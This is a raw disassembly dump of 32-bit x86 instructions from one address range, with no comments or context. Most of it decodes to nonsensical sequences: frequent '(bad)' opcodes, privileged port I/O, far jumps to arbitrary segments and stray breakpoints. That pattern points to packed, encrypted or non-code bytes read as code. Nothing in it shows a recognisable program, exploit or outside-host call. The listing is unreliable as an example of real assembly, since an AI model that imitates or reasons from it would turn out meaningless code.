  41a5dc:	or     eax,0x61e26cf8
  41a5e1:	pop    esi
  41a5e2:	test   ch,ah
  41a5e4:	add    BYTE PTR [eax],al
  41a5e6:	lods   eax,DWORD PTR ds:[esi]
  41a5e7:	pop    ss
  41a5e8:	lahf   
  41a5e9:	popf   
  41a5ea:	and    eax,0x5c54cb9c
  41a5ef:	xchg   ebp,eax
  41a5f0:	inc    ebx
  41a5f1:	xchg   BYTE PTR [esi-0xfdeaca],ah
  41a5f7:	jl     0x41a636
  41a5f9:	and    cl,BYTE PTR [ecx]
  41a5fb:	sbb    edi,DWORD PTR [edi-0x42]
  41a5fe:	ret    0x1a1c
  41a601:	push   edi
  41a602:	out    0x7d,al
  41a604:	sbb    bl,BYTE PTR [eax-0x48e06de6]
  41a60a:	pop    ds
  41a60b:	jmp    0x41a632
  41a60d:	sub    al,0x8d
  41a60f:	push   ebx
  41a610:	pop    ecx
  41a611:	enter  0x8,0x0
  41a615:	xor    al,bh
  41a617:	push   edx
  41a618:	add    eax,0x9b86ee58
  41a61d:	lock int3 
  41a61f:	mov    al,ds:0x25ad0000
  41a624:	and    eax,0xf6bd01e1
  41a629:	pop    ecx
  41a62a:	xchg   ebx,eax
  41a62b:	call   0xda109f1d
  41a630:	stos   BYTE PTR es:[edi],al
  41a631:	cli    
  41a632:	dec    ebx
  41a633:	and    esp,DWORD PTR [edi]
  41a635:	ins    DWORD PTR es:[edi],dx
  41a636:	push   ebx
  41a637:	sbb    ecx,DWORD PTR [edi]
  41a639:	xchg   ebp,eax
  41a63a:	out    0x69,al
  41a63c:	jnp    0x41a5c5
  41a63e:	or     al,BYTE PTR [edx+0x75]
  41a641:	in     eax,dx
  41a642:	push   edx
  41a643:	and    al,0xe9
  41a645:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a646:	push   0x17
  41a648:	cmp    ebx,esi
  41a64a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a64b:	iret   
  41a64c:	stos   BYTE PTR es:[edi],al
  41a64d:	sbb    al,0x9b
  41a64f:	mov    ebp,0xc916d5d0
  41a654:	mov    ah,0x79
  41a656:	mov    esi,0xf40501b
  41a65b:	add    BYTE PTR [eax],al
  41a65d:	adc    bl,BYTE PTR ds:0x81e221c5
  41a663:	out    0xd1,eax
  41a665:	test   al,0x7c
  41a667:	cmp    eax,DWORD PTR [edi+0x5eef1f61]
  41a66d:	(bad)  
  41a66f:	xor    edx,DWORD PTR [edx-0x499ee19a]
  41a675:	out    0xad,al
  41a677:	shl    DWORD PTR [ebp-0x7feb1215],1
  41a67d:	xchg   ecx,eax
  41a67e:	add    BYTE PTR [eax],al
  41a680:	inc    eax
  41a681:	dec    esp
  41a682:	add    BYTE PTR [eax],al
  41a684:	dec    edx
  41a685:	inc    ebx
  41a686:	adc    BYTE PTR [ebx-0x65],bl
  41a689:	pop    ds
  41a68a:	(bad)  
  41a68b:	aad    0x8
  41a68d:	sbb    DWORD PTR [eax],eax
  41a68f:	add    dl,al
  41a691:	xchg   esi,eax
  41a692:	jbe    0x41a6b8
  41a694:	arpl   WORD PTR [esi],bx
  41a696:	add    ebp,DWORD PTR [edx+0x304a0aa4]
  41a69c:	pop    esi
  41a69d:	cmp    eax,0xd933d547
  41a6a2:	call   0xf124:0x7aa203f4
  41a6a9:	ins    BYTE PTR es:[edi],dx
  41a6aa:	idiv   BYTE PTR ds:0x513e3524
  41a6b0:	fsubr  DWORD PTR [eax-0x49]
  41a6b3:	inc    edx
  41a6b4:	(bad)  
  41a6b5:	cmp    eax,0x45c8d6
  41a6ba:	add    BYTE PTR [esi],bh
  41a6bc:	icebp  
  41a6bd:	inc    esi
  41a6be:	push   ds
  41a6bf:	mov    edx,0x69c6f6d9
  41a6c4:	inc    ecx
  41a6c5:	push   es
  41a6c6:	(bad)  
  41a6c7:	stc    
  41a6c8:	ja     0x41a712
  41a6ca:	jb     0x41a6cc
  41a6cc:	add    cl,bh
  41a6ce:	std    
  41a6cf:	inc    esi
  41a6d0:	lds    ebx,FWORD PTR [ebx+0xa73835f]
  41a6d6:	sub    eax,0x2944
  41a6db:	rol    DWORD PTR [ebx+edx*1+0x78ef0000],cl
  41a6e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a6e3:	push   ds
  41a6e4:	cld    
  41a6e5:	mov    ah,0xce
  41a6e7:	pop    ss
  41a6e8:	pop    ebp
  41a6e9:	mov    ah,0x53
  41a6eb:	adc    BYTE PTR [ecx+0x6f53c2b3],0xf3
  41a6f2:	outs   dx,DWORD PTR ds:[esi]
  41a6f3:	sub    esi,ecx
  41a6f5:	mov    ah,0xc8
  41a6f7:	pop    ss
  41a6f8:	add    BYTE PTR [eax],al
  41a6fa:	jae    0x41a6d3
  41a6fc:	imul   ebx,DWORD PTR [esi],0x14
  41a6ff:	add    dh,BYTE PTR [edi-0x72]
  41a702:	jmp    0x946d097a
  41a707:	sbb    eax,0xa144
  41a70c:	adc    dl,BYTE PTR [edx+0xca80]
  41a712:	add    ebp,DWORD PTR [ebx+0x7d]
  41a715:	adc    esi,DWORD PTR [esi-0x41]
  41a718:	xchg   esi,eax
  41a719:	add    ecx,esi
  41a71b:	add    DWORD PTR [edi+ebp*1+0x0],0x0
  41a720:	retf   0xd274
  41a723:	inc    eax
  41a724:	loop   0x41a726
  41a726:	add    BYTE PTR [ecx+0x33],al
  41a729:	xor    dh,0x0
  41a72c:	add    ch,al
  41a72e:	add    ch,BYTE PTR [edi]
  41a730:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a731:	adc    eax,edx
  41a733:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a734:	cs jge 0x41a6fe
  41a737:	jp     0x41a70d
  41a739:	push   ss
  41a73a:	int    0x85
  41a73c:	imul   edx
  41a73e:	adc    bh,BYTE PTR [esi-0x214123eb]
  41a744:	mov    ds:0x63ddeadb,al
  41a749:	add    BYTE PTR [esi+0x0],al
  41a74c:	add    BYTE PTR [ecx+eiz*4+0x73572b06],bl
  41a753:	fdivr  DWORD PTR [edi-0x61ed437b]
  41a759:	pop    ecx
  41a75a:	sbb    ch,dh
  41a75c:	sbb    esp,DWORD PTR ds:0xc1e4af11
  41a762:	leave  
  41a763:	adc    eax,0xbacbf01e
  41a768:	jb     0x41a7d4
  41a76a:	mov    ah,0xaf
  41a76c:	mov    ch,0xdd
  41a76e:	int3   
  41a76f:	rol    BYTE PTR [eax],cl
  41a771:	add    dl,cl
  41a773:	sbb    al,0x58
  41a775:	arpl   WORD PTR [esi+0x4eccb4],dx
  41a77b:	add    BYTE PTR [edx],al
  41a77d:	imul   BYTE PTR [ebx]
  41a77f:	jmp    0x0:0x2280c5b4
  41a786:	sbb    eax,ecx
  41a788:	mov    bl,0x0
  41a78a:	add    BYTE PTR [ebx],dh
  41a78c:	ds leave 
  41a78e:	cmc    
  41a78f:	sbb    edi,ecx
  41a791:	(bad)  [edx-0x22]
  41a794:	add    edi,DWORD PTR [edx+0xe10828]
  41a79a:	add    BYTE PTR [eax-0x7dffff82],al
  41a7a0:	push   esp
  41a7a1:	push   cs
  41a7a2:	mov    BYTE PTR ds:0x82660000,cl
  41a7a8:	fmul   st(0),st
  41a7aa:	ins    BYTE PTR es:[edi],dx
  41a7ab:	add    BYTE PTR [eax],al
  41a7ad:	outs   dx,DWORD PTR es:[esi]
  41a7af:	cmp    BYTE PTR [ebp+0x1d700000],0xae
  41a7b6:	inc    esp
  41a7b7:	jnp    0x41a7b9
  41a7b9:	add    ch,bl
  41a7bb:	jmp    0x93c2:0x74e25bd9
  41a7c2:	mov    ebx,0x3dae668b
  41a7c7:	cli    
  41a7c8:	sbb    ebx,esi
  41a7ca:	add    eax,0x7240
  41a7cf:	sbb    ch,bl
  41a7d1:	das    
  41a7d2:	test   BYTE PTR [ecx+0xb090000],ah
  41a7d8:	into   
  41a7d9:	pop    edx
  41a7da:	sbb    bl,BYTE PTR ss:[edx]
  41a7dd:	into   
  41a7de:	jno    0x41a7c6
  41a7e0:	add    eax,0xbf4db5b4
  41a7e5:	mov    BYTE PTR [ecx-0x213c0000],al
  41a7eb:	add    BYTE PTR [eax],al
  41a7ed:	shl    DWORD PTR [edi],cl
  41a7ef:	nop
  41a7f0:	xor    BYTE PTR ds:0xb80c53,al
  41a7f6:	add    al,ah
  41a7f8:	fcomi  st,st(4)
  41a7fa:	adc    eax,0xfe9a02b2
  41a7ff:	aaa    
  41a800:	and    al,0x1d
  41a802:	cmp    DWORD PTR [esi],edi
  41a804:	imul   DWORD PTR [ecx]
  41a806:	or     DWORD PTR [ebp+0x7c],0xffffffd5
  41a80a:	stos   BYTE PTR es:[edi],al
  41a80b:	sub    eax,0xab72293
  41a810:	push   ebx
  41a811:	xor    BYTE PTR [ebx+0x388bdfa7],bh
  41a817:	mov    ebp,0xaf327127
  41a81c:	imul   ecx,DWORD PTR [ecx-0x265ffef2],0xfffffffb
  41a823:	scas   al,BYTE PTR es:[edi]
  41a824:	rcl    BYTE PTR [esi-0xed8cc92],cl
  41a82a:	out    dx,eax
  41a82b:	add    al,0x20
  41a82d:	add    BYTE PTR [eax],al
  41a82f:	jmp    0x591:0xb2307b05
  41a836:	stc    
  41a837:	cdq    
  41a838:	rcr    ebx,1
  41a83a:	fst    QWORD PTR [eax]
  41a83c:	mov    bl,0x8c
  41a83e:	jp     0x41a840
  41a840:	add    BYTE PTR [ebx+0x2a],cl
  41a843:	test   BYTE PTR [eax+eax*1+0x5f53f700],bh
  41a84a:	mov    ds:0xf254d63c,eax
  41a84f:	lahf   
  41a850:	pop    ecx
  41a851:	inc    esi
  41a852:	les    edx,FWORD PTR [edx]
  41a854:	add    BYTE PTR [eax],al
  41a856:	pop    ds
  41a857:	mov    dl,0x2c
  41a859:	or     eax,0xb8a7d622
  41a85e:	jmp    0xdc9f:0x5bf6d942
  41a865:	dec    esi
  41a866:	fxch   st(1)
  41a868:	fs retf 0xf5e3
  41a86c:	and    BYTE PTR [ebp+0x63c8],al
  41a872:	in     eax,0xcb
  41a874:	int    0xf7
  41a876:	add    eax,0xd9dfc511
  41a87b:	lods   al,BYTE PTR ds:[esi]
  41a87c:	loope  0x41a81b
  41a87e:	jnp    0x41a864
  41a880:	adc    DWORD PTR [edi+eiz*8+0x0],ecx
  41a884:	add    BYTE PTR [edx+0x11],al
  41a887:	cmp    DWORD PTR [edx+0x7a],edi
  41a88a:	cmp    bl,dh
  41a88c:	dec    ebx
  41a88d:	inc    edx
  41a88e:	sbb    DWORD PTR [esi+0x40b03930],ecx
  41a894:	(bad)  
  41a895:	add    BYTE PTR [eax],al
  41a897:	(bad)  
  41a898:	loopne 0x41a834
  41a89a:	ja     0x41a8b8
  41a89c:	mov    ebp,0xf8e94f33
  41a8a1:	cmc    
  41a8a2:	iret   
  41a8a3:	(bad)  
  41a8a4:	push   edx
  41a8a5:	out    0xf6,eax
  41a8a7:	sbb    ebp,ebp
  41a8a9:	push   eax
  41a8aa:	addr16 jmp 0xbfcf7b7f
  41a8b0:	loopne 0x41a84d
  41a8b2:	and    edx,ecx
  41a8b4:	jmp    0xfe4c4a72
  41a8b9:	hlt    
  41a8ba:	fwait
  41a8bb:	xlat   BYTE PTR ds:[ebx]
  41a8bc:	add    ch,BYTE PTR [ebp+0xfeb3498]
  41a8c2:	mov    bh,0x8d
  41a8c4:	xchg   ecx,eax
  41a8c5:	loope  0x41a8db
  41a8c7:	jg     0x41a904
  41a8c9:	or     eax,0xb01ec586
  41a8ce:	pop    ebp
  41a8cf:	cwde   
  41a8d0:	cs sbb cl,0x0
  41a8d4:	add    BYTE PTR [esi],ah
  41a8d6:	or     edx,DWORD PTR [eax-0x14]
  41a8d9:	into   
  41a8da:	sbb    cl,0x0
  41a8dd:	add    BYTE PTR [eax+0x16131238],dh
  41a8e3:	int3   
  41a8e4:	repnz add BYTE PTR [eax],al
  41a8e7:	push   ebx
  41a8e8:	nop
  41a8e9:	inc    ebx
  41a8ea:	popf   
  41a8eb:	adc    edx,0x4b8e8741
  41a8f1:	mov    ecx,0x14c
  41a8f6:	mov    ah,0x6e
  41a8f8:	jnp    0x41a95e
  41a8fa:	scas   eax,DWORD PTR es:[edi]
  41a8fb:	std    
  41a8fc:	xchg   esp,eax
  41a8fd:	nop
  41a8fe:	clc    
  41a8ff:	lds    ecx,FWORD PTR [eax+0x28]
  41a902:	add    BYTE PTR [eax],al
  41a904:	aam    0xfb
  41a906:	xor    esp,DWORD PTR [eax+0x40]
  41a909:	js     0x41a90b
  41a90b:	add    BYTE PTR [edi+0xed040d],dh
  41a911:	add    BYTE PTR [ebx],dh
  41a913:	retf   
  41a914:	cmp    eax,DWORD PTR [edx+edx*8+0x0]
  41a918:	add    BYTE PTR [eax-0x48],al
  41a91b:	add    BYTE PTR [eax],al
  41a91d:	inc    ebx
  41a91e:	cdq    
  41a91f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a920:	xor    DWORD PTR [eiz*2+0x2ca1fd11],0x5f
  41a928:	push   ecx
  41a929:	pop    ds
  41a92a:	cmp    DWORD PTR [ebp-0x75d742d4],ebp
  41a930:	inc    esi
  41a931:	arpl   WORD PTR [esp+eax*8],bx
  41a934:	add    BYTE PTR [eax],0x0
  41a937:	call   0x8000:0xd00c58
  41a93e:	mov    es,WORD PTR [eax]
  41a940:	add    BYTE PTR [ebx+0x1ba7a27b],al
  41a946:	mov    cl,0xba
  41a948:	int3   
  41a949:	inc    BYTE PTR [eax]
  41a94b:	add    BYTE PTR [ebx],al
  41a94d:	or     dh,dh
  41a94f:	fnstenv [eax-0x62]
  41a952:	add    BYTE PTR [esi+0x67f30000],dl
  41a958:	retf   
  41a959:	dec    edx
  41a95a:	pop    esp
  41a95b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a95c:	or     esi,DWORD PTR [esi+0x5b0f960]
  41a962:	hlt    
  41a963:	mov    DWORD PTR [ebp-0x54],eax
  41a966:	sbb    al,0xa9
  41a968:	sbb    bl,al
  41a96a:	cmp    eax,0xefb19656
  41a96f:	lods   eax,DWORD PTR ds:[esi]
  41a970:	out    0x30,al
  41a972:	mov    ch,0x25
  41a974:	(bad)  
  41a975:	fbstp  TBYTE PTR [eax]
  41a977:	cs push ss
  41a979:	sahf   
  41a97a:	mov    al,0xed
  41a97c:	out    dx,eax
  41a97d:	xor    eax,0xecff5c28
  41a982:	lock test bl,dh
  41a985:	add    BYTE PTR [eax],al
  41a987:	fwait
  41a988:	jmp    0xe918:0xd6abae4b
  41a98f:	nop
  41a990:	int    0x11
  41a992:	leave  
  41a993:	fnstcw WORD PTR [edi+0x19c5977b]
  41a999:	loopne 0x41aa02
  41a99b:	shl    DWORD PTR [eax+0x7ea0348e],0xea
  41a9a2:	mov    al,ds:0xefc7e423
  41a9a7:	sub    BYTE PTR [ebp-0x57],cl
  41a9aa:	sbb    esi,DWORD PTR [edi]
  41a9ac:	stc    
  41a9ad:	jmp    0xa919cd15
  41a9b2:	imul   ebx,DWORD PTR [eax],0xffffffe4
  41a9b5:	rcl    dl,1
  41a9b7:	jp     0x41a950
  41a9b9:	gs cli 
  41a9bb:	sub    ch,bh
  41a9bd:	adc    ah,bh
  41a9bf:	mov    ch,BYTE PTR [ebp+0x19181c9f]
  41a9c5:	adc    BYTE PTR [eax+0x0],0x0
  41a9c9:	mov    eax,0xd0923af0
  41a9ce:	sbb    eax,0x1428f3b
  41a9d3:	pop    ecx
  41a9d4:	mov    ebp,0x828c
  41a9d9:	cmp    eax,0xb6eb7f5b
  41a9de:	aad    0x94
  41a9e0:	push   esi
  41a9e1:	dec    edx
  41a9e2:	shl    BYTE PTR [ebx+0x62994dde],cl
  41a9e8:	xor    DWORD PTR [ebp+esi*1-0xdcae4d2],0x45
  41a9f0:	push   cs
  41a9f1:	int    0x8c
  41a9f3:	cli    
  41a9f4:	add    BYTE PTR [eax],al
  41a9f6:	adc    edi,DWORD PTR [ebx+0x4f]
  41a9f9:	inc    edx
  41a9fa:	xchg   ebp,eax
  41a9fb:	aaa    
  41a9fc:	fmul   DWORD PTR [edi+eax*1+0x5b0a0000]
  41aa03:	mul    BYTE PTR [esi+esi*2-0x1a]
  41aa07:	scas   al,BYTE PTR es:[edi]
  41aa08:	mov    ch,BYTE PTR [ebx+eiz*8+0x7b48f67f]
  41aa0f:	add    BYTE PTR [eax],al
  41aa11:	jg     0x41aa39
  41aa13:	and    al,0x4b
  41aa15:	mov    ah,0xa
  41aa17:	and    eax,0xda710f43
  41aa1c:	or     eax,0xe9dcb40f
  41aa21:	sbb    DWORD PTR [ecx+edi*2-0x6],edx
  41aa25:	ins    DWORD PTR es:[edi],dx
  41aa26:	stos   BYTE PTR es:[edi],al
  41aa27:	nop
  41aa28:	and    bl,dh
  41aa2a:	pop    ecx
  41aa2b:	or     cl,al
  41aa2d:	add    BYTE PTR [eax],0x0
  41aa30:	inc    eax
  41aa31:	daa    
  41aa32:	add    BYTE PTR [eax],al
  41aa34:	call   0x4a39:0x93e0e42e
  41aa3b:	add    edi,0xffffffc8
  41aa3e:	pop    edx
  41aa3f:	add    BYTE PTR [eax],al
  41aa41:	adc    BYTE PTR [esi-0x60],al
  41aa44:	adc    eax,eax
  41aa46:	bound  eax,QWORD PTR [eax]
  41aa48:	add    dh,bh
  41aa4a:	test   BYTE PTR [edx-0x335eee36],0xc7
  41aa51:	add    BYTE PTR [eax],al
  41aa53:	dec    edx
  41aa54:	idiv   BYTE PTR [edx-0x5212d176]
  41aa5a:	scas   al,BYTE PTR es:[edi]
  41aa5b:	out    dx,al
  41aa5c:	repz out 0x43,al
  41aa5f:	jns    0x41aac6
  41aa61:	mov    esi,0x8e4ae2b1
  41aa66:	adc    BYTE PTR [esi-0x52830000],0x49
  41aa6d:	or     BYTE PTR [ebx+0x0],0x0
  41aa71:	pusha  
  41aa72:	aam    0xe9
  41aa74:	jmp    DWORD PTR [esi+0x69]
  41aa77:	ret    0xef79
  41aa7a:	and    al,0xf0
  41aa7c:	jge    0x41aa54
  41aa7e:	dec    edi
  41aa7f:	ret    
  41aa80:	(bad)  
  41aa82:	loopne 0x41aaee
  41aa84:	push   ebp
  41aa85:	(bad)  
  41aa86:	cmp    bx,0xf
  41aa8a:	xchg   esi,esi
  41aa8c:	or     BYTE PTR [esi],dh
  41aa8e:	add    BYTE PTR [eax],al
  41aa90:	nop
  41aa91:	cmp    dl,ah
  41aa93:	mov    ebx,0xf61ea87f
  41aa98:	es cmp eax,0xf8d2e495
  41aa9e:	push   eax
  41aa9f:	sub    eax,DWORD PTR [esi+eax*8+0x0]
  41aaa3:	add    al,bh
  41aaa5:	push   ebp
  41aaa6:	out    dx,al
  41aaa7:	dec    esp
  41aaa8:	leave  
  41aaa9:	add    BYTE PTR [eax],al
  41aaab:	rcl    cl,1
  41aaad:	outs   dx,DWORD PTR ds:[esi]
  41aaae:	dec    ebx
  41aaaf:	mov    esp,DWORD PTR [ecx]
  41aab1:	fwait
  41aab2:	push   ds
  41aab3:	ss retf 
  41aab5:	adc    al,0x79
  41aab7:	or     eax,0x51f4f3d0
  41aabc:	jmp    0x77db:0x5c2e4731
  41aac3:	cmp    edi,0xffffffa4
  41aac6:	(bad)  
  41aac7:	mov    ecx,0x83af1b0
  41aacc:	or     al,BYTE PTR [eax]
  41aace:	add    cl,dh
  41aad0:	xchg   esi,eax
  41aad1:	inc    edx
  41aad2:	jno    0x41aaa6
  41aad4:	icebp  
  41aad5:	jnp    0x41aa97
  41aad7:	das    
  41aad8:	add    BYTE PTR [eax],al
  41aada:	mov    ah,0x12
  41aadc:	push   eax
  41aadd:	mov    DWORD PTR [edi-0x2dac0a13],ebx
  41aae3:	push   0xadc638d1
  41aae8:	mov    DWORD PTR [esi],ecx
  41aaea:	jle    0x41aac5
  41aaec:	into   
  41aaed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aaee:	jmp    0x41aacd
  41aaf0:	icebp  
  41aaf1:	pop    es
  41aaf2:	iret   
  41aaf3:	int    0x17
  41aaf5:	cld    
  41aaf6:	cli    
  41aaf7:	call   FWORD PTR [edx]
  41aaf9:	jns    0x41aad1
  41aafb:	sbb    al,0xb5
  41aafd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aafe:	test   dl,bh
  41ab00:	add    BYTE PTR [eax],al
  41ab02:	xor    bl,BYTE PTR [ecx+0x776f9492]
  41ab08:	push   edi
  41ab09:	out    dx,al
  41ab0a:	mov    es,WORD PTR [ebx]
  41ab0c:	fldcw  WORD PTR [edi]
  41ab0e:	jle    0x41aacc
  41ab10:	mov    ds:0xe20a371f,al
  41ab15:	out    0x22,al
  41ab17:	out    dx,eax
  41ab18:	test   BYTE PTR [ebx+0x35060000],bl
  41ab1e:	xlat   BYTE PTR ds:[ebx]
  41ab1f:	aad    0x93
  41ab21:	sbb    esp,edi
  41ab23:	fmul   st(2),st
  41ab25:	jmp    0xa500:0x9544e0
  41ab2c:	xchg   ecx,eax
  41ab2d:	mov    ebp,0x96f4f7d3
  41ab32:	jno    0x41ab6e
  41ab34:	leave  
  41ab35:	mov    esp,0xde8d1a85
  41ab3a:	int    0xec
  41ab3c:	(bad)  
  41ab3d:	inc    edx
  41ab3e:	and    BYTE PTR [ecx],ah
  41ab40:	push   esi
  41ab41:	sbb    al,0xb9
  41ab43:	sar    ch,0x0
  41ab46:	add    BYTE PTR [edx],cl
  41ab48:	arpl   si,ax
  41ab4a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ab4b:	(bad)  
  41ab4c:	pop    ecx
  41ab4d:	push   ebp
  41ab4e:	mov    ebx,0x1c1fad89
  41ab53:	sahf   
  41ab54:	cmp    eax,0xc5574bc2
  41ab59:	sub    esp,DWORD PTR [edx+0x6f28c33d]
  41ab5f:	sub    al,0xc9
  41ab61:	push   edi
  41ab62:	ffreep st(0)
  41ab64:	add    BYTE PTR [eax],0x0
  41ab67:	jp     0x41ab8d
  41ab69:	add    eax,DWORD PTR [edi+0x3e]
  41ab6c:	push   ss
  41ab6d:	je     0x41ab7b
  41ab6f:	int3   
  41ab70:	add    BYTE PTR [eax],al
  41ab72:	sub    DWORD PTR [ebx-0x113b9310],ebp
  41ab78:	add    BYTE PTR [eax],al
  41ab7a:	jg     0x41ab62
  41ab7c:	xor    DWORD PTR [edi-0x5d],0x3c
  41ab80:	mov    ebp,0xbe4793ed
  41ab85:	push   esi
  41ab86:	dec    esp
  41ab87:	jno    0x41ab89
  41ab89:	add    BYTE PTR [esi-0xa],ah
  41ab8c:	(bad)  
  41ab8d:	sahf   
  41ab8e:	test   al,0x9d
  41ab90:	test   bl,dh
  41ab92:	add    BYTE PTR [eax],al
  41ab94:	clc    
  41ab95:	adc    ebx,DWORD PTR [eax+0xc780c1]
  41ab9b:	add    BYTE PTR [ecx-0xca14648],dh
  41aba1:	sbb    BYTE PTR [esi],ch
  41aba3:	mov    al,0x54
  41aba5:	icebp  
  41aba6:	outs   dx,DWORD PTR ds:[esi]
  41aba7:	sub    ebx,DWORD PTR [ebp-0x5eb7526a]
  41abad:	add    BYTE PTR [eax],al
  41abaf:	sub    eax,edx
  41abb1:	mov    ah,BYTE PTR [ebp+0x44]
  41abb4:	data16 add BYTE PTR [eax],al
  41abb7:	imul   esp,eax,0x89cc1f8b
  41abbd:	add    BYTE PTR [eax],al
  41abbf:	popf   
  41abc0:	stos   DWORD PTR es:[edi],eax
  41abc1:	(bad)  
  41abc2:	repz dec esp
  41abc4:	mov    ch,0x0
  41abc6:	add    ah,dh
  41abc8:	push   ss
  41abc9:	xchg   edi,eax
  41abca:	out    dx,eax
  41abcb:	(bad)  
  41abcc:	loop   0x41aba1
  41abce:	jb     0x41ab95
  41abd0:	push   edi
  41abd1:	sbb    DWORD PTR [ebp+0x7580e01f],eax
  41abd7:	add    BYTE PTR [eax],al
  41abd9:	(bad)  
  41abda:	std    
  41abdb:	adc    dl,BYTE PTR [ebx]
  41abdd:	xchg   ebp,eax
  41abde:	mov    eax,0x6bd5e431
  41abe3:	cmp    eax,0xbd5eb0fd
  41abe8:	aaa    
  41abe9:	push   es
  41abea:	ins    DWORD PTR es:[edi],dx
  41abeb:	das    
  41abec:	mov    edx,0xb1c1726a
  41abf1:	inc    esi
  41abf2:	iret   
  41abf3:	dec    ebp
  41abf4:	mov    bh,0x2c
  41abf6:	mov    ds:0xf03d1574,eax
  41abfb:	mov    edi,0xf640899f
  41ac00:	add    BYTE PTR [eax],al
  41ac02:	shr    BYTE PTR [eax+0x457c5fcb],1
  41ac08:	popf   
  41ac09:	inc    ecx
  41ac0a:	jge    0x41ac3f
  41ac0c:	push   esp
  41ac0d:	sub    BYTE PTR [edx+0x37db59ee],al
  41ac13:	sbb    cl,al
  41ac15:	mov    cl,0xdb
  41ac17:	push   esp
  41ac18:	inc    ecx
  41ac19:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ac1a:	stos   DWORD PTR es:[edi],eax
  41ac1b:	fild   QWORD PTR [ebx-0x34]
  41ac1e:	outs   dx,BYTE PTR ds:[esi]
  41ac1f:	add    BYTE PTR [eax],al
  41ac21:	xlat   BYTE PTR ds:[ebx]
  41ac22:	inc    edx
  41ac23:	mov    ds:0xc7848f93,al
  41ac28:	add    BYTE PTR [eax],al
  41ac2a:	add    BYTE PTR [ecx+0x0],dh
  41ac2d:	add    BYTE PTR [eax],bh
  41ac2f:	stos   BYTE PTR es:[edi],al
  41ac30:	sbb    cl,BYTE PTR [edx+ebx*8+0x0]
  41ac34:	add    ah,bl
  41ac36:	and    eax,ebp
  41ac38:	enter  0x60,0x0
  41ac3c:	mov    ds:0x7f8ed087,al
  41ac41:	add    DWORD PTR [edx-0x1cb5f279],0xbf049c
  41ac4b:	add    BYTE PTR [edx+0x10],dh
  41ac4e:	jmp    0x98ea:0x8b82a8f5
  41ac55:	inc    esi
  41ac56:	cs push cs
  41ac58:	push   0x53
  41ac5a:	aam    0x2c
  41ac5c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ac5d:	inc    ebp
  41ac5e:	aaa    
  41ac5f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ac60:	jmp    0x13067c1f
  41ac65:	add    BYTE PTR [eax],al
  41ac67:	mov    ds:0x99e13e85,eax
  41ac6c:	sub    DWORD PTR [esi+edi*1-0x17b9980a],0x45
  41ac74:	or     BYTE PTR [eax],ah
  41ac76:	add    BYTE PTR [eax],al
  41ac78:	je     0x41ac69
  41ac7a:	int3   
  41ac7b:	mov    eax,DWORD PTR [eax]
  41ac7d:	add    BYTE PTR [ebp-0x6711ef60],ch
  41ac83:	outs   dx,BYTE PTR ds:[esi]
  41ac84:	xor    DWORD PTR [eax-0x2a],edx
  41ac87:	int3   
  41ac88:	rol    BYTE PTR [eax],0x0
  41ac8b:	pop    esp
  41ac8c:	outs   dx,DWORD PTR ds:[esi]
  41ac8d:	leave  
  41ac8e:	xchg   esi,eax
  41ac8f:	push   ecx
  41ac90:	mov    edx,0xeeeed60e
  41ac95:	sbb    dl,BYTE PTR ds:0xf29fb865
  41ac9b:	retf   0x5b06
  41ac9e:	jg     0x41ac38
  41aca0:	push   es
  41aca1:	add    edi,0xffffffb8
  41aca4:	add    dl,bh
  41aca6:	xlat   BYTE PTR ds:[ebx]
  41aca7:	cmp    edx,esp
  41aca9:	xchg   DWORD PTR [edi+0x78],esi
  41acac:	test   BYTE PTR [ebx+0x2d],0xab
  41acb0:	sbb    BYTE PTR [ebx],dh
  41acb2:	jle    0x41ad17
  41acb4:	sub    eax,0xf0e87dce
  41acb9:	retf   0x93ec
  41acbc:	je     0x41ac7a
  41acbe:	ret    
  41acbf:	add    esi,DWORD PTR [eax+0x50cb0245]
  41acc5:	mov    ds:0x5da3e0c3,eax
  41acca:	jl     0x41ac66
  41accc:	rcl    DWORD PTR [ebx+0x3a],0xd1
  41acd0:	int3   
  41acd1:	leave  
  41acd2:	add    BYTE PTR [eax],al
  41acd4:	in     eax,0x9f
  41acd6:	aaa    
  41acd7:	mov    eax,0xc8340f4f
  41acdc:	adc    eax,DWORD PTR [eax]
  41acde:	add    BYTE PTR [ebx+0x3b],ah
  41ace1:	lods   eax,DWORD PTR ds:[esi]
  41ace2:	xchg   edi,eax
  41ace3:	fcmovne st,st(5)
  41ace5:	retf   
  41ace6:	lahf   
  41ace7:	xchg   esi,eax
  41ace9:	fisub  WORD PTR [esi+0x8b70f75]
  41acef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41acf0:	add    BYTE PTR [eax],al
  41acf2:	and    al,0x38
  41acf4:	inc    edi
  41acf5:	lahf   
  41acf6:	leave  
  41acf7:	xor    al,0xde
  41acf9:	add    al,0x57
  41acfb:	add    BYTE PTR [eax],al
  41acfd:	in     eax,0xe7
  41acff:	and    esi,DWORD PTR [edx+eax*1-0x79]
  41ad03:	rep outs dx,DWORD PTR ds:[esi]
  41ad05:	sbb    edi,DWORD PTR [eax-0x67]
  41ad08:	cmp    bl,BYTE PTR [eax-0x4116443e]
  41ad0e:	cmp    al,0xd8
  41ad10:	mov    dh,0x4d
  41ad12:	inc    esp
  41ad13:	mov    edx,0xf7290000
  41ad18:	jmp    0x8cbbb40a
  41ad1d:	add    BYTE PTR [bx+si],al
  41ad20:	nop
  41ad21:	scas   eax,DWORD PTR es:[edi]
  41ad22:	into   
  41ad23:	xchg   DWORD PTR [edi-0x25e6f5a4],ebp
  41ad29:	xchg   BYTE PTR [ecx-0x10],ah
  41ad2c:	xor    DWORD PTR [eax],ecx
  41ad2e:	dec    esi
  41ad2f:	add    BYTE PTR [eax],al
  41ad31:	adc    al,0xa7
  41ad33:	in     eax,0x8a
